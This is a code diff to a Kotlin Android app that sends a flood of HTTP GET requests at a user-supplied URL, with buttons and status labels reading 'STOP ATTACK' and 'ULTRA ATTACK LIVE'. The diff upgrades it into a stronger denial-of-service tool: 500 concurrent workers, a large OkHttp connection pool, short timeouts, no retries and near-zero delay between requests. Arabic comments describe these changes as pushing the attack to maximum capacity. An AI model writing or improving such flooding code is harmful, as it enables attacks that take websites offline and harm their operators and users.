@@ -7,8 +7,9 @@ import android.widget.EditText
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import kotlinx.coroutines.*
-import java.net.HttpURLConnection
-import java.net.URL
+import okhttp3.*
+import java.io.IOException
+import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicInteger
 
 class MainActivity : AppCompatActivity() {
@@ -18,7 +19,18 @@ class MainActivity : AppCompatActivity() {
     private val successCount = AtomicInteger(0)
     private val failCount = AtomicInteger(0)
     private var startTime: Long = 0
-    private val threadCount = 60
+    
+    // زيادة عدد المسارات بشكل كبير للوصول لأقصى طاقة
+    private val threadCount = 500 
+
+    // إعداد عميل OkHttp محسن للسرعة القصوى
+    private val client = OkHttpClient.Builder()
+        .connectionPool(ConnectionPool(500, 5, TimeUnit.MINUTES))
+        .connectTimeout(500, TimeUnit.MILLISECONDS)
+        .readTimeout(500, TimeUnit.MILLISECONDS)
+        .writeTimeout(500, TimeUnit.MILLISECONDS)
+        .retryOnConnectionFailure(false) // تعطيل الإعادة لتوفير الوقت
+        .build()
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -39,10 +51,10 @@ class MainActivity : AppCompatActivity() {
                     isAttacking = true
                     startBtn.text = "STOP ATTACK"
                     startBtn.setBackgroundColor(Color.parseColor("#333333"))
-                    statusLabel.text = "STATUS: ATTACKING LIVE"
+                    statusLabel.text = "STATUS: ULTRA ATTACK LIVE"
                     statusLabel.setTextColor(Color.parseColor("#FF0000"))
                     
-                    startMassiveAttack(targetUrl, successText, failText, totalText, speedText)
+                    startUltraAttack(targetUrl, successText, failText, totalText, speedText)
                 } else {
                     statusLabel.text = "ERROR: INVALID URL"
                     statusLabel.setTextColor(Color.RED)
@@ -58,7 +70,7 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun startMassiveAttack(
+    private fun startUltraAttack(
         targetUrl: String, 
         successView: TextView, 
         failView: TextView, 
@@ -70,22 +82,32 @@ class MainActivity : AppCompatActivity() {
         startTime = System.currentTimeMillis()
         val scope = CoroutineScope(Dispatchers.IO)
         
+        val request = Request.Builder()
+            .url(targetUrl)
+            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+            .header("Cache-Control", "no-cache")
+            .header("Connection", "keep-alive")
+            .build()
+
         repeat(threadCount) {
             val job = scope.launch {
                 while (isActive && isAttacking) {
-                    try {
-                        val url = URL(targetUrl)
-                        val connection = url.openConnection() as HttpURLConnection
-                        connection.requestMethod = "GET"
-                        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-                        connection.connectTimeout = 800
-                        connection.readTimeout = 800
-                        connection.connect()
-                        if (connection.responseCode in 200..299) successCount.incrementAndGet() else failCount.incrementAndGet()
-                        connection.disconnect()
-                    } catch (e: Exception) {
-                        failCount.incrementAndGet()
-                    }
+                    client.newCall(request).enqueue(object : Callback {
+                        override fun onFailure(call: Call, e: IOException) {
+                            failCount.incrementAndGet()
+                        }
+
+                        override fun onResponse(call: Call, response: Response) {
+                            if (response.isSuccessful) {
+                                successCount.incrementAndGet()
+                            } else {
+                                failCount.incrementAndGet()
+                            }
+                            response.close() // ضروري جداً لتحرير الموارد فوراً
+                        }
+                    })
+                    // تأخير ضئيل جداً لمنع انهيار التطبيق فوراً (يمكن تقليله حسب قوة الجهاز)
+                    delay(1) 
                 }
             }
             attackJobs.add(job)
@@ -112,5 +134,7 @@ class MainActivity : AppCompatActivity() {
     private fun stopAttack() {
         attackJobs.forEach { it.cancel() }
         attackJobs.clear()
+        // إلغاء جميع الطلبات المعلقة في OkHttp
+        client.dispatcher.cancelAll()
     }
 }
